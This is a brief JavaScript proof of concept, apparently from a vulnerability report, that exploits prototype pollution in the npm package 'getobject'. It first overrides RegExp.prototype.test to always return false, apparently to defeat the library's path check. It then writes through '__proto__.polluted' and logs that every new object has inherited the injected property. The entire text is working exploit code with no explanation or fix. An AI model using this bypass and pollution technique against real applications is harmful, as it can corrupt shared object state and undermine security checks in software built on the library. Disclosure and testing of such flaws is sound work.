RegExp.prototype.test = () => false;
console.log({}.polluted);
const getObject = require('getobject');
var obj = {};
getObject.set(obj, '__proto__.polluted', 'yes');
console.log({}.polluted);